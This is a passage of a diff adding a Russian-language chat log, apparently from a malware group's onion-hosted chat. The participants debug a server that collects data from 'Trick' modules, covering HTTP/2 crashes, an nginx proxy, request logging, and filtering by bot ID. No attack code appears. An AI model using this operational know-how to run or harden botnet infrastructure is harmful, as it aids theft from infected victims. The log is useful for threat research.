+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "вот тебе пришел этот бинарный запрос"
+    },
+    "2021-08-30T07:55:38.730187": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и ты говоришь что первый из них нормально парсится и отрабатывает"
+    },
+    "2021-08-30T07:55:38.731720": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "раз так, он должен положить в базу данных новую запись"
+    },
+    "2021-08-30T07:55:38.732592": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "эту запись можно увидеть?"
+    },
+    "2021-08-30T07:55:38.734866": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "там больше нет ничего .."
+    },
+    "2021-08-30T07:55:38.736092": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну т.е. до базы оно не доходит"
+    },
+    "2021-08-30T07:55:38.736362": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "просто в логи ничего не пишется"
+    },
+    "2021-08-30T07:55:38.736556": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ни первый ни второй?"
+    },
+    "2021-08-30T07:55:38.749881": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "да"
+    },
+    "2021-08-30T07:55:38.751220": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну так может это и не мы?"
+    },
+    "2021-08-30T07:55:38.752466": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "может это боты поисковые и т.п ?"
+    },
+    "2021-08-30T07:55:38.753796": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "defender: ты можешь на прокладках отрезать все что не HTTP/1.1 ?"
+    },
+    "2021-08-30T07:55:38.763748": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "все HTTP/2 QUIC и прочий модный кал"
+    },
+    "2021-08-30T07:55:38.764472": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и запретить доступ к веб-серверу не с прокладки"
+    },
+    "2021-08-30T07:55:38.765942": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "говорю же там все как есть передает"
+    },
+    "2021-08-30T07:55:38.766410": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "нет не могу"
+    },
+    "2021-08-30T07:55:38.766633": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "сделал через нджинкс"
+    },
+    "2021-08-30T07:55:38.768212": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "углубленное позже сделаю"
+    },
+    "2021-08-30T07:55:38.768450": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "но пока логирование обычное"
+    },
+    "2021-08-30T07:55:38.769156": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "@defender -- так всё вопрос закрыт ?"
+    },
+    "2021-08-30T08:19:29.153440": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "defender: а почему не могу?\nhttps://stackoverflow.com/questions/39453027/how-to-disable-http2-in-nginx\nя вот так имею в виду - тут пишут что \"могу\""
+    },
+    "2021-08-30T08:19:29.154821": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "defender: а почему не могу?\nhttps://stackoverflow.com/questions/39453027/how-to-disable-http2-in-nginx\nя вот так имею в виду - тут пишут что \"могу\""
+    },
+    "2021-08-30T08:43:21.002751": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "zulas: есть сомнение что те дампы крешей что ты привел - что это были посылки модулей трика"
+    },
+    "2021-08-30T08:43:21.004827": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "zulas: есть сомнение что те дампы крешей что ты привел - что это были посылки модулей трика"
+    },
+    "2021-08-30T08:44:15.469393": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну вообще не были . они были отброшены т.к. не распаршены . ну и очевидно что хттп2 .а не хттп1"
+    },
+    "2021-08-30T08:44:17.032042": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "нужно воспроизвести краш именно на модуле трика, так чтобы втроем с драйвером и кодером модуля разобраться с тем что же именно криво"
+    },
+    "2021-08-30T08:44:17.033112": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "нужно воспроизвести краш именно на модуле трика, так чтобы втроем с драйвером и кодером модуля разобраться с тем что же именно криво"
+    },
+    "2021-08-30T08:44:38.453192": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "для начала давайте отфильтруем внешние запросы ."
+    },
+    "2021-08-30T08:44:47.716060": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я думаю проблема сама собой решится ."
+    },
+    "2021-08-30T08:45:02.141902": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "потому что не может один и тот же модуль\\код выдавать 2 разных протокола ."
+    },
+    "2021-08-30T08:45:02.575404": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "zulas: поясни мне проблему с крешем"
+    },
+    "2021-08-30T08:45:02.583774": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "zulas: поясни мне проблему с крешем"
+    },
+    "2021-08-30T08:45:07.249355": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "почему это проблема?"
+    },
+    "2021-08-30T08:45:07.250264": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "почему это проблема?"
+    },
+    "2021-08-30T08:45:17.025047": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "потому что сервис падает и передача данных кончается?"
+    },
+    "2021-08-30T08:45:17.028868": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "потому что сервис падает и передача данных кончается?"
+    },
+    "2021-08-30T08:45:18.249731": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я хз почему это проблема .. это к дефу"
+    },
+    "2021-08-30T08:45:29.889219": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "потому что в логи краши срет .. и всё"
+    },
+    "2021-08-30T08:45:37.388379": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "сервис остается жив?"
+    },
+    "2021-08-30T08:45:37.391858": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "сервис остается жив?"
+    },
+    "2021-08-30T08:45:40.577292": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "слушает дальше?"
+    },
+    "2021-08-30T08:45:40.579095": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "слушает дальше?"
+    },
+    "2021-08-30T08:45:41.780673": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "конечно"
+    },
+    "2021-08-30T08:45:46.967570": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "твою бать"
+    },
+    "2021-08-30T08:45:46.969195": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "твою бать"
+    },
+    "2021-08-30T08:45:52.599207": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "тогда хули мы тут обсуждаем?"
+    },
+    "2021-08-30T08:45:52.601935": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "тогда хули мы тут обсуждаем?"
+    },
+    "2021-08-30T08:46:00.269170": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я хз . я это сразу говорил"
+    },
+    "2021-08-30T08:46:23.872654": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Краш означает что пришло нечто и оно не попало в базу."
+    },
+    "2021-08-30T08:46:41.500252": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Т.к. не распозналось либой эрланга, верно?"
+    },
+    "2021-08-30T08:47:00.263487": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "нечто - это что угодно, собственно я и сказал что это что угодно, а нормальный POST оно распознает . и обработвает"
+    },
+    "2021-08-30T08:47:01.967848": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "значит мы обсуждаем потерю данных, но мы потеряли день, потому что в качестве примеров были приведены http2-запросы каких-то левых ботов"
+    },
+    "2021-08-30T08:47:01.980447": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "значит мы обсуждаем потерю данных, но мы потеряли день, потому что в качестве примеров были приведены http2-запросы каких-то левых ботов"
+    },
+    "2021-08-30T08:47:43.833130": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "[11:44:17] <buza> нужно воспроизвести краш именно на модуле трика, так чтобы втроем с драйвером и кодером модуля разобраться с тем что же именно криво\\"
+    },
+    "2021-08-30T08:47:43.836700": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "[11:44:17] <buza> нужно воспроизвести краш именно на модуле трика, так чтобы втроем с драйвером и кодером модуля разобраться с тем что же именно криво\\"
+    },
+    "2021-08-30T08:47:53.818490": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "сосредоточтесь на этом"
+    },
+    "2021-08-30T08:47:53.822991": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "сосредоточтесь на этом"
+    },
+    "2021-08-30T08:48:14.362542": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "zulas: найди в логах креш именно от данных модуля, чтобы там был HTTP/1.1"
+    },
+    "2021-08-30T08:48:14.365636": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "zulas: найди в логах креш именно от данных модуля, чтобы там был HTTP/1.1"
+    },
+    "2021-08-30T08:48:24.774121": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "и давайте разбирать нормальный пример"
+    },
+    "2021-08-30T08:48:24.784279": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и давайте разбирать нормальный пример"
+    },
+    "2021-08-30T08:48:31.337635": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "значит для начала нужно обеспечить условия, чтобы только модуль трика мог ко мне данные передавать . иначе мы говорим о любом боте который шлет любое говно"
+    },
+    "2021-08-30T08:49:09.761602": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "деф что-то отрежет, но не думаю что всё"
+    },
+    "2021-08-30T08:49:09.762896": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "деф что-то отрежет, но не думаю что всё"
+    },
+    "2021-08-30T08:49:25.625168": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "по хттп1 тебе все равно будут лезть левые спайдеры"
+    },
+    "2021-08-30T08:49:25.642477": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "по хттп1 тебе все равно будут лезть левые спайдеры"
+    },
+    "2021-08-30T08:51:43.324723": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Есть вариант передать любым способом ключ в бота, и сделать на эрланге проверку, что ключ в запросе совпадает с ключем в базе"
+    },
+    "2021-08-30T08:52:06.211563": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "чтобы что?"
+    },
+    "2021-08-30T08:52:06.213742": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "чтобы что?"
+    },
+    "2021-08-30T08:52:29.669524": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "отсечь все данные которые не относятся к трику."
+    },
+    "2021-08-30T08:52:52.945157": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "вообще-то у бэка есть штатный механизм для этого"
+    },
+    "2021-08-30T08:52:52.946847": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "вообще-то у бэка есть штатный механизм для этого"
+    },
+    "2021-08-30T08:53:08.918577": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "он парсит запрос и вытаскивает ID бота из него"
+    },
+    "2021-08-30T08:53:08.919924": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "он парсит запрос и вытаскивает ID бота из него"
+    },
+    "2021-08-30T08:53:35.691432": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "это и есть ключ, 90% запросов отсечется по невалидному URI с отсутствующим ид бота и группы"
+    },
+    "2021-08-30T08:53:35.693052": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "это и есть ключ, 90% запросов отсечется по невалидному URI с отсутствующим ид бота и группы"
+    },
+    "2021-08-30T08:53:48.790910": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "остальные 9% левых запросов отсечется по неправдоподобному ИД бота"
+    },
+    "2021-08-30T08:53:48.796349": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "остальные 9% левых запросов отсечется по неправдоподобному ИД бота"
+    },
+    "2021-08-30T08:53:54.541526": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "но можно и падать"
+    },
+    "2021-08-30T08:53:54.543024": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "но можно и падать"
+    },
+    "2021-08-30T08:56:42.266761": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "падает потому что ему протокол непонятен - он ожидает одно, а нихера не приходит ."
+    },
+    "2021-08-30T08:57:05.201793": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "когда протокол понятен - то и соответствущя реакция на него независимо правильный он ( от нас) или не правильны (от чужих)"
+    },
+    "2021-08-30T08:57:35.261983": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "вот когда отсечет .. тогда можно говорить о чем . а если падает только на левых .."
+    },
+    "2021-08-30T09:00:25.674576": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "еще раз, какую проблему мы решаем?"
+    },
+    "2021-08-30T09:00:25.676210": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "еще раз, какую проблему мы решаем?"
+    },
+    "2021-08-30T09:03:21.871866": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "то что бэк падает на левых данных это не проблема. Он что-то не может распарсить, ну и ладно"
+    },
+    "2021-08-30T09:03:21.877805": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "то что бэк падает на левых данных это не проблема. Он что-то не может распарсить, ну и ладно"
+    },
+    "2021-08-30T09:03:46.741451": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я пока вижу левые данные только"
+    },
+    "2021-08-30T09:03:53.973178": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "driver: ?"
+    },
+    "2021-08-30T09:03:53.978069": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "driver: ?"
+    },
+    "2021-08-30T09:10:20.681922": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Вообще про краши говорил дэф."
+    },
+    "2021-08-30T09:10:34.438011": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Я думаю что нам надо закрыть логи"
+    },
+    "2021-08-30T09:11:15.487084": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Чтобы можно было понять что приходит на бэк. Чтобы если краши появляются можно было понять что именно причина"
+    },
+    "2021-08-30T09:11:29.533713": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "У нас есть поток тестовых данных которые всегда ошибки вызывают."
+    },
+    "2021-08-30T09:13:13.920196": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Например я часто вычищаю из базы какие то записи которые явно не в тему. Их там 6 штук по кукам, но они все время появляются и дальше никогда не проходят"
+    },
+    "2021-08-30T09:14:09.943832": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "То что сейчас сделали с нджинксом - задачу решает пока что.\nНадо только более полные логи настроить"
+    },
+    "2021-08-30T09:14:23.958346": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Чтобы тело пост запросов можно было видеть."
+    },
+    "2021-08-30T09:16:17.559565": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "ну то есть ты говоришь о том, что нужно логирование запросов, а его нету. Верно?"
+    },
+    "2021-08-30T09:16:17.563163": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну то есть ты говоришь о том, что нужно логирование запросов, а его нету. Верно?"
+    },
+    "2021-08-30T09:21:45.713702": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Да"
+    },
+    "2021-08-30T09:21:52.696087": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Сейчас это главное."
+    },
+    "2021-08-30T09:24:33.033530": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Вся история про эту конфу была с сообщения что нужно менять либу парсинга чтобы логи сделать, о чем нам зулас сообщил, но дэф придумал просто поставить проксю нджинкс. Так что я честно не очень понимаю, каких то правок пока нет больше в бэке.\nНо есть проблема, что часть данных не приходит и вот нужно понять почему и тогда дальше думать."
+    },
+    "2021-08-30T09:26:50.170735": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "логи сделаны .. я приводил выдержки оттуда"
+    },
+    "2021-08-30T09:27:47.886558": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "для меня непонятно кто это генерит .. но факт в том что либа не может понять что это ... поэтому краши .. \nхттп1 она обрабатыват .. хттп2 у нас нет .. соотвественно давайте хттп2 просто закроем и всё"
+    },
+    "2021-08-30T09:27:59.134036": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "тогда мы сузим круг возможных проблем и найдем решение для них"
+    },
+    "2021-08-30T09:28:46.217650": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "краши по факту могут быть всегда -- всмысли когда какой-то левый протокол на порт коннектится .. то может быть краш в лог . это не значит что сервис в дауне . это просто значит что один именно этот запрос не вызвал нужной реакции сервера"
+    },
+    "2021-08-30T09:36:07.625411": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "> соотвественно давайте хттп2 просто закроем и всё \nточнее закроем все что не хттп1"
+    },
+    "2021-08-30T09:36:26.646915": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я не думаю что у Nginx проблемы могут быть с такой логикой .. правильно ?"
+    },
+    "2021-08-30T09:43:57.353525": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "всем привет"
+    },
+    "2021-08-30T09:44:05.521783": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "вот для этого я и делал нджинк"
+    },
+    "2021-08-30T09:44:20.139454": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "но он как драйвер сказал не правильно проксировал"
+    },
+    "2021-08-30T09:44:24.802456": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "сейчас я с этим разберусь"
+    },
+    "2021-08-30T09:44:34.746287": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "+ сделаю только хттп1"
+    },
+    "2021-08-30T09:44:44.412954": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "+ логирование запросов и тела"
+    },
+    "2021-08-30T13:22:35.597199": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "сделал логирование"
+    },
+    "2021-08-30T13:22:38.302476": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "/var/log/nginx/access.log"
+    },
+    "2021-08-30T13:22:59.687873": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "все выводит что проходит через нджинкс"
+    },
+    "2021-08-30T13:23:34.903237": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "выпилить хттп2 не так просто, надо собирать свой дистр"
+    },
+    "2021-08-30T13:23:45.775716": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "давайте начнем пока с ищучения лога"
+    },
+    "2021-08-30T13:24:22.988575": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "если деро крашится значит нджинкс примет код не 200 и по нему можно увидеть какие там данные"
+    },
+    "2021-08-30T13:28:03.099692": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "да и если есть там реальный срач, давайте напишите мне регулярку по которой я отсеку в нджинксе все кроме норм запросов"
+    },
+    "2021-08-30T14:30:22.899238": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "все видят что я пишу?"
+    },
+    "2021-08-30T14:30:26.956729": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "смотрите?"
+    },
+    "2021-08-30T14:30:38.866200": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Я вижу."
+    },
+    "2021-08-30T14:31:11.732098": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Я пока не понял как мне сообщение посмотреть и тело запроса.\n\\x16\\x03\\x03\\x00\\xC2\\x01\\x00\\x00\\xBE\\x03\\x03a,O\\xBC\\xF5\\xC6\\xCFw\\x958\\xE8\\x15O@\\xBD)\\xC5\\xD3\\xCA\\x81\\xE2\\xA7i\\xAF\\xCCg\\xA9[6k_/\\x00\\x00&\\xC0,\\xC0+\\xC00\\xC0/\\xC0$\\xC0#\\xC0(\\xC0'\\xC0"
+    },
+    "2021-08-30T14:31:31.402776": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Вот такое есть, это бинарные данные?"
+    },
+    "2021-08-30T14:32:37.711356": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "вот есть так как ты написал"
+    },
+    "2021-08-30T14:32:44.615845": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "в не понятной кодировке"
+    },
+    "2021-08-30T14:32:47.117526": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а есть норм"
+    },
+    "2021-08-30T14:32:53.474404": {
